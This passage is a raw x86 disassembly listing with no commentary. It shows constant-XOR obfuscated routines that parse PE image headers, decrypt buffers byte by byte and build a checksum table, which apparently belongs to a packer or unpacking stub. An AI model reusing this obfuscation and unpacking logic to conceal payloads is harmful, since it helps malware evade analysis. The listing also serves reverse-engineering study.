  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
